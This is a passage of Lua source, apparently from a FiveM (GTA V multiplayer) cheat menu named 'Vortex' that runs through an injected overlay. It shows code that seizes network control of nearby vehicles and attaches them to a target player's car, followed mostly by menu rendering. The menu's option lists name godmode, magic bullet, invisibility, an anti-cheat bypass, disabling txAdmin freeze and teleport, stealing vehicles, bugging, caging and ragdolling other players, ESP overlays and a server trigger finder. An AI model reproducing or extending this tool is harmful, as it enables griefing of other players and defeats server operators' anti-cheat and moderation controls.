                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                SetEntityVisible(playerPed, true, false)
                SetCamActive(rampCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(rampCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Citizen.Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end
                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                SetEntityHeading(playerPed, myHeading)
                Citizen.Wait(100)
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            local rampPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) and DoesEntityExist(targetVehicle) then
                    local pos = rampPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], targetVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end

            Citizen.Wait(500)
            SetEntityVisible(playerPed, true, false)
            SetCamActive(rampCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(rampCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)
        end)
        end
    end
}


function UpdateNearbyPlayers()
    vortex_nearbyPlayers = {}
    local localPed = PlayerPedId()
    local localCoords = GetEntityCoords(localPed)

    for _, player in ipairs(GetActivePlayers()) do
        local targetPed = GetPlayerPed(player)
        local targetCoords = GetEntityCoords(targetPed)
        local distance = #(localCoords - targetCoords)

        if distance < 500.0 then
            local playerId = GetPlayerServerId(player)
            local playerName = GetPlayerName(player)
            table.insert(vortex_nearbyPlayers, {
                id = playerId,
                name = playerName,
                distance = math.floor(distance)
            })
        end
    end

    table.sort(vortex_nearbyPlayers, function(a, b) return a.distance < b.distance end)
end

function DrawMiscTargetInterface()
    if not Vortex_SusanoReady() then return end
    local options = {"Warp Vehicle", "Bug Player", "Bug Vehicle V1", "Steal Vehicle"}
    local totalItems = #options

    local boxWidth = 190
    local boxHeight = 140
    local boxX = (1920 / 2) - (boxWidth / 2)
    local boxY = 900

    local itemHeight = 28.5
    local headerHeight = 26

    Susano.DrawRectFilled(boxX, boxY, boxWidth, headerHeight,
        VortexStyle.headerColor[1], VortexStyle.headerColor[2], VortexStyle.headerColor[3], VortexStyle.headerColor[4],
        0.0)

    local titleText = "MISC TARGET"
    local titleWidth = Susano.GetTextWidth(titleText, VortexStyle.itemSize)
    Susano.DrawText(boxX + (boxWidth - titleWidth) / 2, boxY + 8,
        titleText, VortexStyle.itemSize,
        VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 1.0)

    local currentY = boxY + headerHeight
    local startY = currentY

    for i, option in ipairs(options) do
        local itemY = currentY + ((i - 1) * itemHeight)
        local isSelected = (i == vortex_miscTargetSelectedOption)

        if isSelected then
            Susano.DrawRectFilled(boxX, itemY, boxWidth, itemHeight,
                VortexStyle.selectedColor[1], VortexStyle.selectedColor[2], VortexStyle.selectedColor[3], VortexStyle.selectedColor[4],
                0.0)
        else
            Susano.DrawRectFilled(boxX, itemY, boxWidth, itemHeight,
                VortexStyle.itemColor[1], VortexStyle.itemColor[2], VortexStyle.itemColor[3], VortexStyle.itemColor[4],
                0.0)
        end

        local textX = boxX + 15
        Susano.DrawText(textX, itemY + 8,
            option, VortexStyle.itemSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 1.0)
        Susano.DrawText(textX + 0.3, itemY + 8,
            option, VortexStyle.itemSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 0.7)

        if isSelected then
            local arrowX = boxX + boxWidth - 20
            Susano.DrawText(arrowX, itemY + 8, ">", VortexStyle.itemSize,
                VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3], 1.0)
        end
    end

    if totalItems > 1 then
        local itemsAreaHeight = totalItems * itemHeight
        local scrollbarX = boxX - VortexStyle.scrollbarWidth - 10
        local scrollbarY = startY
        local scrollbarHeight = itemsAreaHeight

        Susano.DrawRectFilled(scrollbarX, scrollbarY, VortexStyle.scrollbarWidth, scrollbarHeight,
            VortexStyle.bgColor[1] + 0.05, VortexStyle.bgColor[2] + 0.05, VortexStyle.bgColor[3] + 0.05, VortexStyle.bgColor[4] * 0.5,
            VortexStyle.scrollbarWidth / 2)

        local segmentHeight = scrollbarHeight / totalItems

        local thumbY = scrollbarY + ((vortex_miscTargetSelectedOption - 1) * segmentHeight)
        local thumbHeight = segmentHeight

        if not VortexMenu.miscTargetScrollbarY then
            VortexMenu.miscTargetScrollbarY = thumbY
        end
        if not VortexMenu.miscTargetScrollbarHeight then
            VortexMenu.miscTargetScrollbarHeight = thumbHeight
        end

        local smoothSpeed = 0.7
        VortexMenu.miscTargetScrollbarY = VortexMenu.miscTargetScrollbarY + (thumbY - VortexMenu.miscTargetScrollbarY) * smoothSpeed
        VortexMenu.miscTargetScrollbarHeight = VortexMenu.miscTargetScrollbarHeight + (thumbHeight - VortexMenu.miscTargetScrollbarHeight) * smoothSpeed

        local thumbPadding = 1
        Susano.DrawRectFilled(scrollbarX + thumbPadding, VortexMenu.miscTargetScrollbarY + thumbPadding,
            VortexStyle.scrollbarWidth - (thumbPadding * 2), VortexMenu.miscTargetScrollbarHeight - (thumbPadding * 2),
            VortexStyle.scrollbarThumb[1], VortexStyle.scrollbarThumb[2], VortexStyle.scrollbarThumb[3], VortexStyle.scrollbarThumb[4],
            (VortexStyle.scrollbarWidth - (thumbPadding * 2)) / 2)
    end
end

-- Keybinds overlay position: 1=Top-Right, 2=Top-Left, 3=Bottom-Right, 4=Bottom-Left
local vortex_keybindsPosition = 1
local vortex_keybindsPositionOptions = {"Top-Right", "Top-Left", "Bottom-Right", "Bottom-Left"}

function DrawKeybindsInterface()
    if not vortex_showMenuKeybindsEnabled then return end
    if not Vortex_SusanoReady() then return end

    local screenW, screenH = GetActiveScreenResolution()
    local margin = 16
    local pad = 12
    local rowH = 24
    local fs = 12
    local fsSmall = 11
    local round = 8.0

    local acR, acG, acB = VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3]

    -- Build entries
    local entries = {}
    if vortex_menuKey then
        table.insert(entries, {label = "Menu Toggle", key = Vortex_GetKeyName(vortex_menuKey), isHeader = true})
    end

    local acts = {}
    for actionName, keyCode in pairs(vortex_actionKeybinds) do
        if keyCode then
            local lbl = Vortex_GetActionLabel(actionName)
            local kn = Vortex_GetKeyName(keyCode)
            local on = false
            local fn = vortex_toggleActions[actionName]
            if fn then local ok, v = pcall(fn); if ok then on = v end end
            table.insert(acts, {label = lbl, key = kn, active = on})
        end
    end
    table.sort(acts, function(a, b) return a.label < b.label end)
    if #acts > 0 then
        table.insert(entries, {isSep = true})
        for _, e in ipairs(acts) do table.insert(entries, e) end
    end
    if #entries == 0 then return end

    -- Measure
    local maxW = 0
    local headerH = 28
    local totalH = pad + headerH
    for _, e in ipairs(entries) do
        if e.isSep then
            totalH = totalH + 8
        else
            local lw = Susano.GetTextWidth(e.label, fs)
            local kw = Susano.GetTextWidth(e.key, fsSmall) + 14
            local rw = lw + kw + 40
            if rw > maxW then maxW = rw end
            totalH = totalH + rowH
        end
    end
    totalH = totalH + pad
    local panelW = math.max(200, maxW + pad * 2)

    -- Position
    local posX, posY
    local pos = vortex_keybindsPosition
    if pos == 1 then posX = screenW - panelW - margin; posY = margin
    elseif pos == 2 then posX = margin; posY = margin
    elseif pos == 3 then posX = screenW - panelW - margin; posY = screenH - totalH - margin
    elseif pos == 4 then posX = margin; posY = screenH - totalH - margin
    else posX = screenW - panelW - margin; posY = margin end

    -- Shadow
    Susano.DrawRectFilled(posX + 2, posY + 2, panelW, totalH, 0.0, 0.0, 0.0, 0.25, round)

    -- Background
    Susano.DrawRectFilled(posX, posY, panelW, totalH, 0.05, 0.05, 0.06, 0.9, round)

    -- Top accent line
    Susano.DrawRectFilled(posX + pad, posY, panelW - pad * 2, 2, acR, acG, acB, 0.65, 1.0)

    -- Title
    local title = "KEYBINDS"
    local tw = Susano.GetTextWidth(title, fsSmall)
    Susano.DrawText(posX + (panelW - tw) / 2, posY + 8, title, fsSmall, acR, acG, acB, 0.8)

    -- Header separator
    Susano.DrawRectFilled(posX + pad, posY + headerH, panelW - pad * 2, 1, 0.18, 0.18, 0.2, 0.4, 0.0)

    -- Entries
    local dy = posY + pad + headerH
    for _, e in ipairs(entries) do
        if e.isSep then
            Susano.DrawRectFilled(posX + pad + 4, dy + 3, panelW - pad * 2 - 8, 1,
                acR * 0.3, acG * 0.3, acB * 0.3, 0.3, 0.0)
            dy = dy + 8
        else
            local ty = dy + (rowH / 2) - (fs / 2)
            local on = not e.isHeader and e.active

            -- Active row bg
            if on then
                Susano.DrawRectFilled(posX + 3, dy, panelW - 6, rowH,
                    acR * 0.08, acG * 0.08, acB * 0.08, 0.45, 4.0)
            end

            -- Label
            if e.isHeader then
                Susano.DrawText(posX + pad, ty, e.label, fs, 1.0, 1.0, 1.0, 0.95)
            else
                local la = on and 0.9 or 0.5
                Susano.DrawText(posX + pad, ty, e.label, fs, 0.8, 0.8, 0.82, la)
            end

            -- Key badge
            local kw = Susano.GetTextWidth(e.key, fsSmall)
            local bw = kw + 12
            local bh = rowH - 8
            local bx = posX + panelW - pad - bw
            local by = dy + 4

            if e.isHeader then
                Susano.DrawRectFilled(bx, by, bw, bh, acR * 0.2, acG * 0.2, acB * 0.2, 0.6, 4.0)
                Susano.DrawText(bx + (bw - kw) / 2, by + (bh / 2) - (fsSmall / 2), e.key, fsSmall, acR, acG, acB, 1.0)
            elseif on then
                Susano.DrawRectFilled(bx, by, bw, bh, acR * 0.15, acG * 0.15, acB * 0.15, 0.5, 4.0)
                Susano.DrawText(bx + (bw - kw) / 2, by + (bh / 2) - (fsSmall / 2), e.key, fsSmall, acR, acG, acB, 0.9)
            else
                Susano.DrawRectFilled(bx, by, bw, bh, 0.1, 0.1, 0.1, 0.4, 4.0)
                Susano.DrawText(bx + (bw - kw) / 2, by + (bh / 2) - (fsSmall / 2), e.key, fsSmall, 0.4, 0.4, 0.4, 0.55)
            end

            dy = dy + rowH
        end
    end
end

function DrawMenu()
    if not VortexMenu.isOpen and not vortex_miscTargetInterfaceOpen and not vortex_showMenuKeybindsEnabled then return end
    if not Vortex_SusanoReady() then return end

    local drawOk, drawErr = pcall(function()

    if not VortexMenu.isOpen and vortex_miscTargetInterfaceOpen then
        Susano.BeginFrame()
        DrawMiscTargetInterface()
        if vortex_showMenuKeybindsEnabled then
            DrawKeybindsInterface()
        end
        Susano.SubmitFrame()
        return
    end

    if not VortexMenu.isOpen and vortex_showMenuKeybindsEnabled then
        Susano.BeginFrame()
        DrawKeybindsInterface()
        Susano.SubmitFrame()
        return
    end

    Susano.BeginFrame()

    local category = vortex_categories[VortexMenu.currentCategory]
    if not category then
        VortexMenu.currentCategory = "main"
        category = vortex_categories["main"]
    end

    local currentItems
    if category.hasTabs then
        if VortexMenu.currentTab < 1 then VortexMenu.currentTab = 1 end
        if VortexMenu.currentTab > #category.tabs then VortexMenu.currentTab = #category.tabs end

        if category.tabs[VortexMenu.currentTab].isDynamic and VortexMenu.currentCategory == "online" then
            UpdateNearbyPlayers()
            category.tabs[VortexMenu.currentTab].items = {}

            table.insert(category.tabs[VortexMenu.currentTab].items, {
                label = "Spectate Player",
                action = "spectate"
            })
            table.insert(category.tabs[VortexMenu.currentTab].items, {
                label = "Teleport",
                action = "teleport",
                hasSelector = true
            })
            table.insert(category.tabs[VortexMenu.currentTab].items, {
                label = "",
                isSeparator = true,
                separatorText = "Player List"
            })
            table.insert(category.tabs[VortexMenu.currentTab].items, {
                label = "Select",
                action = "selectmode",
                hasSelector = true
            })

            for _, playerData in ipairs(vortex_nearbyPlayers) do
                table.insert(category.tabs[VortexMenu.currentTab].items, {
                    label = playerData.name .. " (" .. playerData.distance .. "m)",
                    action = "selectplayer",
                    playerId = playerData.id
                })
            end
            if #vortex_nearbyPlayers == 0 then
                table.insert(category.tabs[VortexMenu.currentTab].items, {
                    label = "No players nearby",
                    action = "none"
                })
            end
        end

        currentItems = category.tabs[VortexMenu.currentTab].items
    else
        currentItems = category.items
    end

    local x, y = VortexStyle.x, VortexStyle.y
    local width, height = VortexStyle.width, VortexStyle.height
    local spacing = VortexStyle.itemSpacing

    local currentY = y

-- Check if the banner is enabled
if VortexBanner.enabled then
    local vortex_bannerHeight = VortexBanner.height
    local bannerX = x
    local bannerY = currentY
    local vortex_bannerWidth = width
    local topRounding = VortexStyle.bannerRounding

    -- Function to draw the gradient background of the banner (when no image is provided)
    local function drawGradientBackground(yPosition)
        Susano.DrawRectFilled(bannerX, yPosition, vortex_bannerWidth, vortex_bannerHeight, 0.08, 0.08, 0.15, 0.95, topRounding)
        Susano.DrawRectFilled(bannerX, yPosition, vortex_bannerWidth, vortex_bannerHeight / 2, 0.15, 0.2, 0.35, 0.4, topRounding)
    end

    local function drawTitleText(yPosition)
        local titleWidth = Susano.GetTextWidth(VortexBanner.text, VortexStyle.bannerTitleSize)
        Susano.DrawText(bannerX + (vortex_bannerWidth - titleWidth) / 2, yPosition + 27,
            VortexBanner.text, VortexStyle.bannerTitleSize,
            VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3], 1.0)
    end

    local function drawSubtitleText(yPosition)
        local subWidth = Susano.GetTextWidth(VortexBanner.subtitle, VortexStyle.bannerSubtitleSize)
        Susano.DrawText(bannerX + (vortex_bannerWidth - subWidth) / 2, yPosition + 60,
            VortexBanner.subtitle, VortexStyle.bannerSubtitleSize,
            VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.9)
    end

    -- Draw a black rect behind everything first to fill any rounding gaps
    Susano.DrawRectFilled(bannerX, bannerY, vortex_bannerWidth, vortex_bannerHeight, 0.0, 0.0, 0.0, 1.0, 0.0)

    if vortex_bannerTexture and vortex_bannerTexture > 0 then
        -- First: draw image WITHOUT rounding (fills entire rect, bottom is flush)
        Susano.DrawImage(vortex_bannerTexture, bannerX, bannerY, vortex_bannerWidth, vortex_bannerHeight, 1, 1, 1, 1, 0.0)
        -- Second: draw image WITH rounding on top (overwrites top area with rounded corners)
        -- The bottom stays flush from the first draw
        Susano.DrawImage(vortex_bannerTexture, bannerX, bannerY, vortex_bannerWidth, vortex_bannerHeight, 1, 1, 1, 1, topRounding)
    else
        drawGradientBackground(bannerY)
        drawTitleText(bannerY)
        drawSubtitleText(bannerY)
    end

    currentY = currentY + vortex_bannerHeight
end


    local topGray = 0.0
    local bottomBlack = 0.0
    local gradientSteps = 15
    local titleBarHeight = VortexStyle.headerHeight
    local accentLineH = 2

    -- For root tabbed category, use smaller title bar and show current tab name
    local titleText
    local isRootMenu = (category.hasTabs and VortexMenu.currentCategory == "main")
    if isRootMenu then
        titleBarHeight = 28
        local activeTab = category.tabs[VortexMenu.currentTab]
        titleText = (activeTab and activeTab.name or "Main"):upper()
    else
        titleText = (category.title or "Menu"):upper()
    end

    local acR, acG, acB = VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3]

    -- Top accent line (colored, visible)
    Susano.DrawRectFilled(x, currentY, width, accentLineH, acR, acG, acB, 1.0, 0.0)
    currentY = currentY + accentLineH

    -- Title bar background
    Susano.DrawRectFilled(x, currentY, width, titleBarHeight, 0.0, 0.0, 0.0, 1.0, 0.0)

    -- Title text
    local titleSize = isRootMenu and 15 or VortexStyle.itemSize
    local titleWidth = Susano.GetTextWidth(titleText, titleSize)
    local titleX = x + (width - titleWidth) / 2
    local titleY = currentY + (titleBarHeight / 2) - (titleSize / 2) + 1

    Susano.DrawText(titleX, titleY,
        titleText, titleSize,
        1.0, 1.0, 1.0, 1.0)

    currentY = currentY + titleBarHeight

    -- Bottom accent line
    Susano.DrawRectFilled(x, currentY, width, accentLineH, acR, acG, acB, 1.0, 0.0)
    currentY = currentY + accentLineH

    if category.hasTabs then
        local tabWidth = width / #category.tabs

        for i, tab in ipairs(category.tabs) do
            local tabX = x + (i - 1) * tabWidth
            local isActiveTab = (i == VortexMenu.currentTab)

            local tabBaseR, tabBaseG, tabBaseB
            if isActiveTab then
                tabBaseR, tabBaseG, tabBaseB = VortexStyle.tabActiveColor[1] * 0.6, VortexStyle.tabActiveColor[2] * 0.6, VortexStyle.tabActiveColor[3] * 0.6
            else
                tabBaseR, tabBaseG, tabBaseB = 0.03, 0.03, 0.03
            end

            local tabDarkenAmount = 0.25
            local tabGradientSteps = 15
            local tabStepHeight = VortexStyle.tabHeight / tabGradientSteps

            for step = 0, tabGradientSteps - 1 do
                local stepY = currentY + (step * tabStepHeight)
                local stepGradientFactor = step / (tabGradientSteps - 1)
                local stepDarken = stepGradientFactor * tabDarkenAmount

                local stepR = math.max(0, tabBaseR - stepDarken)
                local stepG = math.max(0, tabBaseG - stepDarken)
                local stepB = math.max(0, tabBaseB - stepDarken)

                local stepAlpha = isActiveTab and 1.0 or 0.90

                Susano.DrawRectFilled(tabX, stepY, tabWidth, tabStepHeight,
                    stepR, stepG, stepB, stepAlpha, 0.0)
            end

            local tabTextSize = VortexStyle.itemSize
            if tab.name == "Server Triggers" then
                tabTextSize = VortexStyle.itemSize - 2
            end

            local tabTextWidth = Susano.GetTextWidth(tab.name, tabTextSize)
            local tabTextX = tabX + (tabWidth - tabTextWidth) / 2
            Susano.DrawText(tabTextX, currentY + 9,
                tab.name, tabTextSize,
                VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 1.0)
        end

        currentY = currentY + VortexStyle.tabHeight
    end

    local totalItems = #currentItems
    local maxVisible = VortexMenu.maxVisibleItems

    if VortexMenu.selectedIndex > VortexMenu.scrollOffset + maxVisible then
        VortexMenu.scrollOffset = VortexMenu.selectedIndex - maxVisible
    elseif VortexMenu.selectedIndex <= VortexMenu.scrollOffset then
        VortexMenu.scrollOffset = VortexMenu.selectedIndex - 1
    end

    if VortexMenu.scrollOffset < 0 then VortexMenu.scrollOffset = 0 end
    if VortexMenu.scrollOffset > math.max(0, totalItems - maxVisible) then
        VortexMenu.scrollOffset = math.max(0, totalItems - maxVisible)
    end

    local startY = currentY
    local visibleStart = VortexMenu.scrollOffset + 1
    local visibleEnd = math.min(VortexMenu.scrollOffset + maxVisible, totalItems)

    for i = visibleStart, visibleEnd do
        local item = currentItems[i]
        local displayIndex = i - VortexMenu.scrollOffset
        local itemY = startY + ((displayIndex - 1) * (height + spacing))
        local isSelected = (i == VortexMenu.selectedIndex)

        if isSelected then
            local baseR, baseG, baseB = VortexStyle.selectedColor[1], VortexStyle.selectedColor[2], VortexStyle.selectedColor[3]
            local darkenAmount = 0.25

            local gradientSteps = 20
            local stepHeight = height / gradientSteps

            for step = 0, gradientSteps - 1 do
                local stepY = itemY + (step * stepHeight)
                local stepGradientFactor = step / (gradientSteps - 1)
                local stepDarken = stepGradientFactor * darkenAmount

                local stepR = math.max(0, baseR - stepDarken)
                local stepG = math.max(0, baseG - stepDarken)
                local stepB = math.max(0, baseB - stepDarken)

                Susano.DrawRectFilled(x, stepY, width, stepHeight,
                    stepR, stepG, stepB, VortexStyle.selectedColor[4],
                    0.0)
            end
        else
            Susano.DrawRectFilled(x, itemY, width, height,
                VortexStyle.itemColor[1], VortexStyle.itemColor[2], VortexStyle.itemColor[3], VortexStyle.itemColor[4],
                VortexStyle.itemRounding)
        end

        if item.isSeparator then
            local separatorY = itemY + (height / 2) - 1
            local separatorMargin = 15
            local separatorText = item.separatorText or "Separator"
            local textWidth = Susano.GetTextWidth(separatorText, VortexStyle.itemSize)
            local textGap = 10

            local leftLineWidth = (width - (separatorMargin * 2) - textWidth - (textGap * 2)) / 2
            Susano.DrawRectFilled(x + separatorMargin, separatorY, leftLineWidth, 2,
                1.0, 1.0, 1.0, 1.0, 0.0)

            local textX = x + separatorMargin + leftLineWidth + textGap
            Susano.DrawText(textX, itemY + 10,
                separatorText, VortexStyle.itemSize,
                1.0, 1.0, 1.0, 1.0)

            local rightLineX = textX + textWidth + textGap
            Susano.DrawRectFilled(rightLineX, separatorY, leftLineWidth, 2,
                1.0, 1.0, 1.0, 1.0, 0.0)
        else
        local textX = x + 15
            -- Draw icon texture if item has one and it's loaded
            if item.icon and vortex_iconTextures[item.icon] then
                local iconSize = VortexStyle.itemSize
                local iconX = textX
                local iconY = itemY + (height - iconSize) / 2 - 1
                local iconW = Vortex_DrawItemIcon(item.icon, iconX, iconY, iconSize,
                    VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3], 0.9)
                textX = textX + (iconW or 0)
            end
            Vortex_DrawIconLabel(textX, itemY + 10,
            item.label, VortexStyle.itemSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 1.0)
            Vortex_DrawIconLabel(textX + 0.3, itemY + 10,
            item.label, VortexStyle.itemSize,
            VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 0.7)

            -- Draw bound key badge for canBind items
            if item.canBind and item.boundKeyDisplay then
                local acR, acG, acB = VortexStyle.accentColor[1], VortexStyle.accentColor[2], VortexStyle.accentColor[3]
                local bkdSize = VortexStyle.itemSize - 1
                local bkdText = item.boundKeyDisplay
                local bkdW = Susano.GetTextWidth(bkdText, bkdSize)
                local badgePad = 8
                local badgeW = bkdW + badgePad * 2
                local badgeH = height - 6
                local badgeX = x + width - badgeW - 10
                local badgeY = itemY + 3
                local hasKey = vortex_actionKeybinds[item.action] ~= nil
                if hasKey then
                    Susano.DrawRectFilled(badgeX, badgeY, badgeW, badgeH, acR * 0.15, acG * 0.15, acB * 0.15, 0.5, 4.0)
                    Susano.DrawText(badgeX + badgePad, itemY + 10, bkdText, bkdSize, acR, acG, acB, 0.95)
                else
                    Susano.DrawRectFilled(badgeX, badgeY, badgeW, badgeH, 0.1, 0.1, 0.1, 0.35, 4.0)
                    Susano.DrawText(badgeX + badgePad, itemY + 10, bkdText, bkdSize, 0.35, 0.35, 0.35, 0.5)
                end
            end
        end

        if not item.isSeparator then
            local toggleStates = {
                godmode = vortex_godmodeEnabled, antiheadshot = vortex_antiHeadshotEnabled, noclipbind = vortex_noclipEnabled,
                noclipinvisible = vortex_noclipInvisibleEnabled,
                invisible = vortex_invisibleEnabled, fastrun = vortex_fastRunEnabled, superjump = vortex_superJumpEnabled, noragdoll = vortex_noRagdollEnabled, antifreeze = vortex_antiFreezeEnabled, throwvehicle = vortex_throwvehicleEnabled,
                editormode = vortex_editorModeEnabled,
                spectate = vortex_spectateEnabled,
                blackhole = (rawget(_G, 'black_hole_active') == true),
                attachplayer = (rawget(_G, 'attach_player_active') == true),
                solosession = vortex_solosessionEnabled,
                misctarget = vortex_miscTargetEnabled,
                shooteyes = vortex_shooteyesEnabled,
                magicbullet = vortex_magicbulletEnabled,
                infiniteammo = vortex_infiniteAmmoEnabled,
                drawfov = vortex_drawFovEnabled,
                easyhandling = vortex_easyhandlingEnabled,
                gravitatevehicle = vortex_gravitatevehicleEnabled,
                nocolision = vortex_nocolisionEnabled,
                freecam = vortex_freecamEnabled,
                eventlogger = vortex_eventloggerEnabled,
                bypassdriveby = vortex_bypassDrivebyEnabled,
                teleportinto = vortex_teleportIntoEnabled,
                forcevehicleengine = vortex_forceVehicleEngineEnabled,
                boostvehicle = vortex_boostVehicleEnabled,
                txadminplayerids = vortex_txAdminPlayerIDsEnabled,
                txadminnoclip = vortex_txAdminNoclipEnabled,
                disablealltxadmin = vortex_disableAllTxAdminEnabled,
                disabletxadminteleport = vortex_disableTxAdminTeleportEnabled,
                disabletxadminfreeze = vortex_disableTxAdminFreezeEnabled,
                ragdollplayersrzrp = (vxGet('ragdollPlayersRZRPEnabled') == true),
                bagclosestplayersrzrp = (vxGet('bagPlayersRZRPEnabled') == true),
                showmenukeybinds = vortex_showMenuKeybindsEnabled,
                visual_enable = VortexVisuals.enable,
                visual_draw_npcs = VortexVisuals.drawNPCs,
                visual_draw_self = VortexVisuals.drawSelf,
                visual_ignore_dead = VortexVisuals.ignoreDead,
                visual_fullbright = VortexVisuals.fullBright,
                visual_fov_toggle = VortexVisuals.fovEnabled,
                crosshair_toggle = VortexVisuals.crosshair.enabled,
                vehicle_visual_toggle = VortexVisuals.vehicle.enabled,
                vehicle_draw_spawn = VortexVisuals.vehicle.drawSpawnName,
                vehicle_draw_lock = VortexVisuals.vehicle.drawLockState,
                box_toggle = VortexVisuals.box.enabled,
                box_draw_health = VortexVisuals.box.drawHealth,
                box_draw_armor = VortexVisuals.box.drawArmor,
                box_see_invis = VortexVisuals.box.seeInvisible,
                skeleton_toggle = VortexVisuals.skeleton.enabled,
                text_toggle = VortexVisuals.text.enabled,
                text_name = VortexVisuals.text.name.enabled,
                text_id = VortexVisuals.text.id.enabled,
                text_health = VortexVisuals.text.health.enabled,
                text_armor = VortexVisuals.text.armor.enabled,
                text_distance = VortexVisuals.text.distance.enabled,
                text_weapon = VortexVisuals.text.weapon.enabled
            }

            local sliderActions = {"noclipbind", "drawfov", "easyhandling", "freecam", "health", "armour"}
            local isSlider = false
            for _, sliderAction in ipairs(sliderActions) do
                if item.action == sliderAction then
                    isSlider = true
                    break
                end
            end

            local hasSliderAndToggle = (item.action == "drawfov" or item.action == "easyhandling" or item.action == "freecam")

            local buttonActions = {"none", "shootplayer", "bugplayer", "cageplayer", "dropvehicle", "bugvehicle", "warpvehicle", "warpboost", "tptoocean", "stealvehicle", "givevehicle", "kickvehicle", "bypassac", "menustaff", "randomoutfit", "repairvehicle", "model_male", "model_female", "model_animals", "triggersfinder", "loadresources", "findtrigger_resource"}
            local isButton = false
            for _, btnAction in ipairs(buttonActions) do
                if item.action == btnAction then
                    isButton = true
                    break
                end
            end

            local isPlayerItem = (item.action == "selectplayer" and item.playerId ~= nil)

            if item.action == "category" and item.target then
            local arrowX = x + width - 20
                Susano.DrawText(arrowX, itemY + 10, ">>", VortexStyle.itemSize,
                VortexStyle.textColor[1], VortexStyle.textColor[2], VortexStyle.textColor[3], 1.0)
        else
            if item.hasSelector and item.action == "teleport" then
                local selectorText = VortexMenu.teleportMode == "player" and "To Player" or "Into Vehicle"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "tptoocean" then
                local locationNames = {
                    ocean = "Ocean",
                    mazebank = "Maze Bank",
                    sandyshores = "Sandy Shores"
                }
                local selectorText = locationNames[VortexMenu.tpLocation] or "Ocean"
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)
            end

            if item.hasSelector and item.action == "menutheme" then
                local selectorText = vortex_currentTheme
                local selectorSize = VortexStyle.itemSize
                local selectorWidth = Susano.GetTextWidth("< " .. selectorText .. " >", selectorSize)
                local selectorX = x + width - selectorWidth - 20

                Susano.DrawText(selectorX, itemY + 10, "<", selectorSize,
                    VortexStyle.textSecondary[1], VortexStyle.textSecondary[2], VortexStyle.textSecondary[3], 0.8)

                local textWidth = Susano.GetTextWidth(selectorText, selectorSize)
                Susano.DrawText(selectorX + 10, itemY + 10, selectorText, selectorSize,
                    1.0, 1.0, 1.0, 1.0)

                Susano.DrawText(selectorX + 10 + textWidth + 5, itemY + 10, ">", selectorSize,
